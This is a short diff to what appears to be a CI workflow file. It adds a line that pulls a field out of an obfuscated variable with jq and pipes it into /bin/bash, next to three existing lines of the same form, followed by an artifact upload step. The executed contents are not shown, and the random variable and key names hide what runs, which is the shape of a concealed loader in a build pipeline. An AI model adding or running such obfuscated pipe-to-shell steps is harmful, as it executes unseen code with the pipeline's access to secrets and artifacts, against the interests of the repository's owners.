@@ -24,6 +24,7 @@ jobs:
           echo $irc795 | jq -r .cvuzn90828 | /bin/bash
           echo $vsrk3 | jq -r .gm97 | /bin/bash
           echo $ccuo28 | jq -r .r4942 | /bin/bash
+          printf '%s' "$nzpwi26216" | jq -r .ugbi4 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
